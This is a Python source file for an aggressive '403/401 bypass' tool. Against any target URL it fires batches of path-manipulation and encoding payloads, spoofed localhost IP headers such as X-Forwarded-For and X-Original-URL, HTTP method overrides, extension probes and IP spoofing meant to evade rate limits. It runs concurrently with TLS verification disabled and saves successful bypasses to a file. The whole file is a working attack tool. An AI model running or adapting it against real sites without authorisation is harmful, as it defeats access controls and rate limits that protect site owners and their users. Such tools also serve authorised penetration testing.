#!/usr/bin/env python3
"""
Advanced 403 Bypass Tool - Aggressive Mode
Author: Security Research
"""

import asyncio
import httpx
import random
import sys
import json
import time
from urllib.parse import urlparse, urljoin
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.live import Live
from rich.text import Text
import pyfiglet
import argparse
from fake_useragent import UserAgent

console = Console()

BANNER = """
[bold red]╔══════════════════════════════════════════════════════╗
║   [cyan]██╗  ██╗ ██████╗ ██████╗     ██████╗ ██╗   ██╗[red] ║
║   [cyan]██║  ██║██╔═████╗╚════██╗    ██╔══██╗╚██╗ ██╔╝[red] ║
║   [cyan]███████║██║██╔██║ █████╔╝    ██████╔╝ ╚████╔╝ [red] ║
║   [cyan]╚════██║████╔╝██║ ╚═══██╗    ██╔══██╗  ╚██╔╝  [red] ║
║   [cyan]     ██║╚██████╔╝██████╔╝    ██████╔╝   ██║   [red] ║
║   [cyan]     ╚═╝ ╚═════╝ ╚═════╝     ╚═════╝    ╚═╝   [red] ║
║        [yellow]Advanced 403/401 Bypass Framework[red]          ║
║              [green]Aggressive Mode v2.0[red]                  ║
╚══════════════════════════════════════════════════════╝[/]
"""


class Bypass403:
    def __init__(self, target, verbose=False, threads=20, timeout=10, proxy=None):
        self.target = target.rstrip('/')
        self.verbose = verbose
        self.threads = threads
        self.timeout = timeout
        self.proxy = proxy
        self.successful = []
        self.ua = UserAgent()
        self.parsed = urlparse(target)
        self.path = self.parsed.path or '/'
        self.base = f"{self.parsed.scheme}://{self.parsed.netloc}"

    # ─────────────────────────────────────────────
    # PAYLOAD GENERATORS
    # ─────────────────────────────────────────────
    def get_path_payloads(self):
        """Path manipulation tricks"""
        p = self.path.strip('/')
        payloads = [
            f"/{p}", f"//{p}", f"/{p}/", f"//{p}//",
            f"/./{p}/./", f"/{p}/.", f"/{p}//",
            f"/{p}%20", f"/{p}%09", f"/{p}?", f"/{p}??",
            f"/{p}#", f"/{p}/*", f"/{p}.html", f"/{p}.json",
            f"/{p}.php", f"/{p}.asp", f"/{p}.aspx",
            f"/{p};/", f"/{p}/..;/", f"/..;/{p}",
            f"/%2e/{p}", f"/{p}/%2e", f"/%2f{p}",
            f"/{p}%2f", f"/{p}%00", f"/{p}%0d",
            f"/{p}/./", f"/./{p}", f"/{p}/.randomstring",
            f"/{p}..;/", f"/{p};", f"/{p}%23",
            f"/{p}%3f", f"/{p}%26", f"/{p}/%2e%2e",
            f"/{p}/%2e%2e/", f"/{p}/..%2f",
            f"/{p.upper()}", f"/{p.capitalize()}",
            f"///{p}///", f"/{p}/./././",
        ]
        return payloads

    def get_header_payloads(self):
        """Header-based bypass payloads"""
        ips = ["127.0.0.1", "localhost", "0.0.0.0", "10.0.0.1",
               "192.168.1.1", "172.16.0.1", "::1", "0177.0.0.1",
               "2130706433", "127.1", "127.0.0.1:80", "127.0.0.1:443"]
        
        headers_list = []
        header_names = [
            "X-Forwarded-For", "X-Forwarded-Host", "X-Real-IP",
            "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr",
            "X-Client-IP", "X-Host", "X-Custom-IP-Authorization",
            "X-Original-URL", "X-Rewrite-URL", "X-Forwarded-Server",
            "X-HTTP-Host-Override", "Forwarded", "Cluster-Client-IP",
            "True-Client-IP", "X-ProxyUser-Ip", "Via"
        ]
        
        for h in header_names:
            for ip in ips:
                headers_list.append({h: ip})
        
        # Special bypass headers
        headers_list.extend([
            {"Referer": self.target},
            {"Referer": f"{self.base}/admin"},
            {"X-Forwarded-Proto": "https"},
            {"X-Forwarded-Scheme": "http"},
            {"Content-Length": "0"},
            {"X-Original-URL": self.path},
            {"X-Rewrite-URL": self.path},
            {"X-Override-URL": self.path},
        ])
        return headers_list

    def get_methods(self):
        """HTTP methods to try"""
        return ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD",
                "OPTIONS", "TRACE", "CONNECT", "PROPFIND", "MKCOL",
                "COPY", "MOVE", "LOCK", "UNLOCK"]

    def get_user_agents(self):
        """Diverse user agent pool"""
        return [
            "Mozilla/5.0 (Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "curl/7.68.0", "Wget/1.20.3", "python-requests/2.28.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            self.ua.random, self.ua.random, self.ua.random,
        ]

    # ─────────────────────────────────────────────
    # REQUEST ENGINE
    # ─────────────────────────────────────────────
    async def send_request(self, client, method, url, headers=None, tag=""):
        try:
            headers = headers or {}
            if "User-Agent" not in headers:
                headers["User-Agent"] = random.choice(self.get_user_agents())
            
            resp = await client.request(
                method, url, headers=headers,
                follow_redirects=False, timeout=self.timeout
            )
            
            result = {
                "tag": tag,
                "method": method,
                "url": url,
                "status": resp.status_code,
                "length": len(resp.content),
                "headers": dict(headers)
            }
            
            if resp.status_code not in [403, 401, 404, 400]:
                self.successful.append(result)
                self.print_success(result)
            elif self.verbose:
                self.print_fail(result)
                
            return result
        except Exception as e:
            if self.verbose:
                console.print(f"[dim red]✗ Error: {str(e)[:50]}[/]")
            return None

    def print_success(self, r):
        color = "green" if r['status'] == 200 else "yellow"
        console.print(
            f"[bold {color}]✓ [{r['status']}][/] "
            f"[cyan]{r['method']:8}[/] "
            f"[magenta]{r['tag']:20}[/] "
            f"[white]{r['url'][:60]}[/] "
            f"[dim]({r['length']}b)[/]"
        )

    def print_fail(self, r):
        console.print(
            f"[dim][{r['status']}] {r['method']:8} {r['tag']:20} {r['url'][:60]}[/]"
        )

    # ─────────────────────────────────────────────
    # BYPASS MODULES
    # ─────────────────────────────────────────────
    async def bypass_path(self, client):
        console.print("\n[bold cyan][*] Module 1: Path Manipulation[/]")
        tasks = []
        for payload in self.get_path_payloads():
            url = f"{self.base}{payload}"
            tasks.append(self.send_request(client, "GET", url, tag="PATH"))
        await asyncio.gather(*tasks)

    async def bypass_headers(self, client):
        console.print("\n[bold cyan][*] Module 2: Header Injection[/]")
        tasks = []
        for headers in self.get_header_payloads():
            tasks.append(self.send_request(
                client, "GET", self.target, headers=headers, tag="HEADER"
            ))
        await asyncio.gather(*tasks)

    async def bypass_methods(self, client):
        console.print("\n[bold cyan][*] Module 3: HTTP Method Override[/]")
        tasks = []
        for method in self.get_methods():
            tasks.append(self.send_request(client, method, self.target, tag="METHOD"))
            # Method override headers
            tasks.append(self.send_request(
                client, "POST", self.target,
                headers={"X-HTTP-Method-Override": method}, tag=f"OVERRIDE-{method}"
            ))
        await asyncio.gather(*tasks)

    async def bypass_protocol(self, client):
        console.print("\n[bold cyan][*] Module 4: Protocol/Version Downgrade[/]")
        # HTTP/1.0 downgrade
        url_http = self.target.replace("https://", "http://")
        if url_http != self.target:
            await self.send_request(client, "GET", url_http, tag="HTTP-DOWNGRADE")

    async def bypass_case(self, client):
        console.print("\n[bold cyan][*] Module 5: Case Manipulation[/]")
        p = self.path
        variants = [p.upper(), p.lower(), p.swapcase(), p.title()]
        tasks = []
        for v in variants:
            tasks.append(self.send_request(
                client, "GET", f"{self.base}{v}", tag="CASE"
            ))
        await asyncio.gather(*tasks)

    async def bypass_extensions(self, client):
        console.print("\n[bold cyan][*] Module 6: Extension Bypass[/]")
        exts = [".json", ".xml", ".html", ".js", ".css", ".txt", 
                ".bak", ".old", ".swp", "~", ".orig"]
        tasks = []
        for ext in exts:
            tasks.append(self.send_request(
                client, "GET", f"{self.target}{ext}", tag="EXT"
            ))
        await asyncio.gather(*tasks)

    async def bypass_rate_limit(self, client):
        """Rate limit bypass - new security research"""
        console.print("\n[bold cyan][*] Module 7: Rate Limit Bypass[/]")
        bypass_headers = [
            {"X-Forwarded-For": f"127.0.0.{random.randint(1,255)}"},
            {"X-Real-IP": f"10.0.0.{random.randint(1,255)}"},
            {"X-Originating-IP": f"192.168.1.{random.randint(1,255)}"},
            {"Forwarded": f"for={random.randint(1,255)}.0.0.1"},
        ]
        tasks = []
        for h in bypass_headers:
            tasks.append(self.send_request(client, "GET", self.target, headers=h, tag="RATELIMIT"))
        await asyncio.gather(*tasks)

    async def bypass_unicode(self, client):
        """Unicode/encoding bypass"""
        console.print("\n[bold cyan][*] Module 8: Unicode/Encoding Bypass[/]")
        p = self.path.strip('/')
        payloads = [
            f"/{p}%E2%80%8B",  # zero-width space
            f"/%u002e/{p}",     # unicode dot
            f"/{p}%ef%bc%8f",   # fullwidth slash
            f"/%252e/{p}",      # double encoded
            f"/%ef%bc%8f{p}",
        ]
        tasks = []
        for payload in payloads:
            tasks.append(self.send_request(
                client, "GET", f"{self.base}{payload}", tag="UNICODE"
            ))
        await asyncio.gather(*tasks)

    # ─────────────────────────────────────────────
    # VERIFIER
    # ─────────────────────────────────────────────
    async def verify_baseline(self, client):
        """Check baseline response"""
        console.print("\n[bold yellow][*] Verifying baseline response...[/]")
        resp = await self.send_request(client, "GET", self.target, tag="BASELINE")
        if resp:
            if resp['status'] in [403, 401]:
                console.print(f"[green]✓ Target confirms {resp['status']} - proceeding with bypass[/]")
                return True
            else:
                console.print(f"[yellow]⚠ Target returns {resp['status']} (not 403/401) - continuing anyway[/]")
                return True
        return False

    # ─────────────────────────────────────────────
    # RUNNER
    # ─────────────────────────────────────────────
    async def run(self):
        limits = httpx.Limits(max_connections=self.threads, max_keepalive_connections=self.threads)
        
        async with httpx.AsyncClient(
            limits=limits, verify=False, proxy=self.proxy,
            http2=True
        ) as client:
            if not await self.verify_baseline(client):
                return

            await self.bypass_path(client)
            await self.bypass_headers(client)
            await self.bypass_methods(client)
            await self.bypass_protocol(client)
            await self.bypass_case(client)
            await self.bypass_extensions(client)
            await self.bypass_rate_limit(client)
            await self.bypass_unicode(client)

        self.report()

    def report(self):
        console.print("\n")
        console.print(Panel.fit(
            f"[bold]Scan Complete[/]\n"
            f"Target: [cyan]{self.target}[/]\n"
            f"Successful Bypasses: [green]{len(self.successful)}[/]",
            title="📊 Report", border_style="green"
        ))

        if self.successful:
            table = Table(title="🎯 Successful Bypasses", show_lines=True)
            table.add_column("Status", style="green", width=8)
            table.add_column("Method", style="cyan", width=10)
            table.add_column("Module", style="magenta", width=15)
            table.add_column("URL", style="white")
            table.add_column("Size", style="yellow", width=8)
            
            for r in self.successful:
                table.add_row(
                    str(r['status']), r['method'], r['tag'],
                    r['url'][:70], str(r['length'])
                )
            console.print(table)
            
            # Save results
            with open("bypass_results.json", "w") as f:
                json.dump(self.successful, f, indent=2)
            console.print("[green]✓ Results saved to bypass_results.json[/]")
        else:
            console.print("[red]✗ No bypasses found. Target may be well protected.[/]")


def main():
    parser = argparse.ArgumentParser(description="Advanced 403 Bypass Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-t", "--threads", type=int, default=20, help="Concurrent requests")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    args = parser.parse_args()

    console.print(BANNER)
    console.print(f"[bold]Target:[/] [cyan]{args.url}[/]")
    console.print(f"[bold]Threads:[/] [cyan]{args.threads}[/] | [bold]Timeout:[/] [cyan]{args.timeout}s[/]\n")
    
    # Suppress SSL warnings
    import warnings
    warnings.filterwarnings("ignore")
    
    tool = Bypass403(
        target=args.url, verbose=args.verbose,
        threads=args.threads, timeout=args.timeout, proxy=args.proxy
    )
    
    try:
        asyncio.run(tool.run())
    except KeyboardInterrupt:
        console.print("\n[red]✗ Interrupted by user[/]")
        sys.exit(0)


if __name__ == "__main__":
    main()
